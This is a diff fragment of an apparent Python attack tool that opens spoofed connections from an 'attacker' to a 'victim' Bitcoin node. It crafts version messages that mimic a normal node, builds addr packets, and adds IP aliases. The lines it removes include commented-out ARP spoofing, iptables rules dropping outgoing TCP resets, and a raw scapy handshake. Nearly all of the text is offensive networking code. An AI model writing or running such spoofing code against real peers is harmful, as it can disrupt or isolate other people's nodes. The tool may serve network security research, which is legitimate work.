@@ -29,7 +29,7 @@ spoof_IP_sockets = []
 
 iptables_file_path = f'{os.path.abspath(os.getcwd())}/backup.iptables.rules'
 
-"""
+
 def ip_alias(ip_address):
 	print(f'Setting up IP alias {ip_address}')
 	global alias_num
@@ -40,7 +40,7 @@ def ip_alias(ip_address):
 	#terminal(f'iptables -A INPUT -p tcp -s {ip_address} -j ACCEPT')
 	#terminal(f'iptables -A OUTPUT -p tcp -d  {ip_address} -j ACCEPT')
 	alias_num += 1
-"""
+
 
 def terminal(cmd):
 	# print('\n> '+cmd)
@@ -63,70 +63,6 @@ def version_packet(src_ip, dst_ip, src_port, dst_port):
 	# Default is /python-bitcoinlib:0.11.0/
 	msg.strSubVer = bitcoin_subversion.encode() # Look like a normal node
 	return msg
-"""
-def custom_packet(msgtype, src_ip, dst_ip, src_port, dst_port):
-	msg = None
-	if msgtype == 'version':
-		msg = msg_version(bitcoin_protocolversion)
-	elif msgtype == 'verack':
-		msg = msg_verack(bitcoin_protocolversion)
-	elif msgtype == 'addr':
-		msg = msg_addr(bitcoin_protocolversion)
-	elif msgtype == 'inv':
-		msg = msg_inv(bitcoin_protocolversion)
-	elif msgtype == 'getdata':
-		msg = msg_getdata(bitcoin_protocolversion)
-	#elif msgtype == 'merkleblock':
-	#	msg = msg_merkleblock(bitcoin_protocolversion)
-	elif msgtype == 'getblocks':
-		msg = msg_getblocks(bitcoin_protocolversion)
-	elif msgtype == 'getheaders':
-		msg = msg_getheaders(bitcoin_protocolversion)
-	elif msgtype == 'tx':
-		msg = msg_tx(bitcoin_protocolversion)
-	elif msgtype == 'headers':
-		msg = msg_headers(bitcoin_protocolversion)
-	elif msgtype == 'block':
-		msg = msg_block(bitcoin_protocolversion)
-	elif msgtype == 'getaddr':
-		msg = msg_getaddr(bitcoin_protocolversion)
-	elif msgtype == 'mempool':
-		msg = msg_mempool(bitcoin_protocolversion)
-	elif msgtype == 'ping':
-		msg = msg_ping(bitcoin_protocolversion)
-	elif msgtype == 'pong':
-		msg = msg_pong(bitcoin_protocolversion)
-	#elif msgtype == 'notfound':
-	#	msg = msg_notfound(bitcoin_protocolversion)
-	#elif msgtype == 'filterload':
-	#	msg = msg_filterload(bitcoin_protocolversion)
-	#elif msgtype == 'filteradd':
-	#	msg = msg_filteradd(bitcoin_protocolversion)
-	#elif msgtype == 'filterclear':
-	#	msg = msg_filterclear(bitcoin_protocolversion)
-	#elif msgtype == 'sendheaders':
-	#	msg = msg_sendheaders(bitcoin_protocolversion)
-	#elif msgtype == 'feefilter':
-	#	msg = msg_feefilter(bitcoin_protocolversion)
-	#elif msgtype == 'sendcmpct':
-	#	msg = msg_sendcmpct(bitcoin_protocolversion)
-	#elif msgtype == 'cmpctblock':
-	#	msg = msg_cmpctblock(bitcoin_protocolversion)
-	#elif msgtype == 'getblocktxn':
-	#	msg = msg_getblocktxn(bitcoin_protocolversion)
-	#elif msgtype == 'blocktxn':
-	#	msg = msg_blocktxn(bitcoin_protocolversion)
-	#elif msgtype == 'reject':
-	#	msg = msg_reject()
-	else:
-		return None
-
-	#msg.addrFrom.ip = src_ip
-	#msg.addrFrom.port = src_port
-	#msg.addrTo.ip = dst_ip
-	#msg.addrTo.port = dst_port
-	return msg
-"""
 
 # str_addrs = ['1.2.3.4', '5.6.7.8', '9.10.11.12'...]
 def addr_packet(str_addrs):
@@ -143,48 +79,12 @@ def addr_packet(str_addrs):
 	return msg
 
 def initialize_fake_connection(src_ip, dst_ip):
-	########## Temporary
-	#src_ip = attacker_ip
+	########## Skip changing to a random IP, just port :(
+	src_ip = attacker_ip
 	##########
 	src_port = attacker_port
 	dst_port = victim_port
 	print(f'Spoofing with IP {src_ip}:{src_port} to IP {dst_ip}:{dst_port}')
-
-	#mac_address = get_mac_address(network_interface)
-	#arp_spoof(src_ip, mac_address)
-
-	#print('Setting iptables')
-	#print(terminal(f'sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -s {src_ip} -d {dst_ip} -j DROP'))
-	#print(terminal(f'sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -s {src_ip} -j DROP'))
-	#print(terminal(f'sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP'))
-	#time.sleep(5)
-	#print(terminal('sudo iptables -L'))
-	#print(terminal(f'iptables -t raw -A PREROUTING -p tcp --dport {dst_port} -j DROP'))
-
-
-
-	#ip_alias(src_ip)
-	#terminal(f'sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -s {src_ip} -j DROP')
-
-	"""seq = random.randrange(0,2**16)
-	ip = IP(src=src_ip, dst=dst_ip)
-	SYN = TCP(sport=src_port, dport=dst_port, flags='A', seq=seq)
-	#SYN = TCP(sport=src_port, dport=dst_port, flags='S', seq=1000)
-	SYNACK=sr1(ip/SYN)
-	#send(SYNACK)
-	#time.sleep(1)
-	#print('Sending second packet')
-	ack = SYNACK.seq + 1
-	seq += 1
-	ACK=TCP(sport=src_port, dport=dst_port, flags='A', seq=seq, ack=ack)
-	send(ip/ACK)
-	print('Handshake COMPLETE')
-
-	PUSH = TCP(sport=src_port, dport=dst_port, flags='PA', seq=11, ack=ack)
-	send(version_packet(src_ip, dst_ip, dst_port).to_bytes())
-	"""
-
-	#ip_alias(src_ip)
 
 
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
